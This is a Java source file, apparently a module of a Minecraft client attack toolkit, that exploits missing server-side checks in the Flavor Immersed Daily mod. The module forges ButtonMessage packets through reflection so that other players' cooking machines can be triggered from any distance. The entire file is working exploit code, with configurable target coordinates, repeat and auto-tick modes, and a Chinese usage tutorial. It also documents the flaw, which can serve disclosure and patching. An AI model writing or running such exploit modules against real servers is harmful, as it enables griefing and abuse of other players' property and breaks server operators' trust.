package com.redblue.red.modules.flavorimmerseddaily;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.core.BlockPos;

import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * FID-01: Remote machine recipe trigger (VULN-01 + VULN-02)
 *
 * All 12 ButtonMessage handlers only check Level.isLoaded(BlockPos).
 * No distance check, no container-open check.
 * Attacker can remotely trigger any loaded machine's recipe processing.
 *
 * Channel: flavor_immersed_daily:flavor_immersed_daily
 * Wire:    writeByte(discriminator) + writeInt(buttonID) + writeInt(x) + writeInt(y) + writeInt(z)
 *
 * Discriminator indices (alphabetical, AtomicInteger starts at 0):
 *   0=BookGui01, 1=Chaoguo, 2=Choppingboard, 3=Drinking, 4=Dryer,
 *   5=Eggbreakingmachien, 6=Flourboard, 7=Meatmincer, 8=Pot,
 *   9=Pressurecooker, 10=Squeezingmachine, 11=Teapot
 */
public class FID01_RemoteCraft implements AttackModule {

    /** Machine type -> buttonID for normal craft */
    private static final String[] MACHINE_NAMES = {
        "炒锅 Chaoguo",
        "切菜板 Choppingboard",
        "高级饮料 Drinking",
        "烘干机 Dryer",
        "打蛋器 Eggbreaking",
        "面粉案板 Flourboard",
        "绞肉机 Meatmincer",
        "煮锅 Pot",
        "高压锅 Pressurecooker",
        "压榨机 Squeezingmachine",
        "茶壶 Teapot"
    };

    // default buttonID for normal single-recipe trigger
    private static final int[] DEFAULT_BUTTON_ID = { 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0 };

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofEnum("machine", "目标机器", MACHINE_NAMES[0], MACHINE_NAMES),
        ConfigParam.ofInt("button_id", "按钮ID", 0, -1, 10),
        ConfigParam.ofBlock("target_pos", "目标机器坐标"),
        ConfigParam.ofInt("repeat", "单次重复", 1, 1, 100),
        ConfigParam.ofInt("interval", "自动间隔(tick)", 20, 1, 200)
    );

    private long lastTick = 0;

    @Override public String id() { return "fid01_remote_craft"; }
    @Override public String name() { return "远程配方触发"; }
    @Override public String description() { return "远程触发任意已加载机器的配方处理(无距离/容器校验)"; }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 选择目标机器类型\n"
            + "2. 填入目标机器的坐标(需在已加载区块内)\n"
            + "3. 按钮ID通常保持默认(0=普通配方)\n"
            + "4. 点击执行或启用自动模式\n\n"
            + "[原理]\n"
            + "所有ButtonMessage handler仅检查Level.isLoaded\n"
            + "无距离校验，无容器打开校验\n"
            + "可在任意距离触发他人机器";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("flavor_immersed_daily");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        int repeat = getParam("repeat").map(ConfigParam::getInt).orElse(1);
        for (int i = 0; i < repeat; i++) {
            sendPacket();
        }
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        int interval = getParam("interval").map(ConfigParam::getInt).orElse(20);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;
        sendPacket();
    }

    private void sendPacket() {
        String machine = getParam("machine").map(ConfigParam::getString).orElse(MACHINE_NAMES[0]);
        int machineIdx = findMachineIndex(machine);
        int buttonId = getParam("button_id").map(ConfigParam::getInt).orElse(DEFAULT_BUTTON_ID[machineIdx]);
        long packed = getParam("target_pos").map(ConfigParam::getLong).orElse(0L);
        if (packed == 0L) return;
        BlockPos bp = BlockPos.of(packed);

        // Use the machine's own ButtonMessage class via reflection
        String msgClass = getMsgClass(machineIdx);
        PacketForge.sendViaChannel(
            "net.mcreator.flavorimmerseddaily.FlavorImmersedDailyMod", "PACKET_HANDLER",
            msgClass,
            new Class<?>[]{ int.class, int.class, int.class, int.class },
            new Object[]{ buttonId, bp.getX(), bp.getY(), bp.getZ() }
        );
    }

    /** Map machine index to its ButtonMessage class name */
    private String getMsgClass(int idx) {
        String[] MSG_CLASSES = {
            "net.mcreator.flavorimmerseddaily.network.ChaoguoButtonMessage",
            "net.mcreator.flavorimmerseddaily.network.ChoppingboardButtonMessage",
            "net.mcreator.flavorimmerseddaily.network.DrinkingButtonMessage",
            "net.mcreator.flavorimmerseddaily.network.DryerButtonMessage",
            "net.mcreator.flavorimmerseddaily.network.EggbreakingmachienButtonMessage",
            "net.mcreator.flavorimmerseddaily.network.FlourboardButtonMessage",
            "net.mcreator.flavorimmerseddaily.network.MeatmincerButtonMessage",
            "net.mcreator.flavorimmerseddaily.network.PotButtonMessage",
            "net.mcreator.flavorimmerseddaily.network.PressurecookerButtonMessage",
            "net.mcreator.flavorimmerseddaily.network.SqueezingmachineButtonMessage",
            "net.mcreator.flavorimmerseddaily.network.TeapotButtonMessage"
        };
        return MSG_CLASSES[idx];
    }

    private int findMachineIndex(String name) {
        for (int i = 0; i < MACHINE_NAMES.length; i++) {
            if (MACHINE_NAMES[i].equals(name)) return i;
        }
        return 0;
    }
}
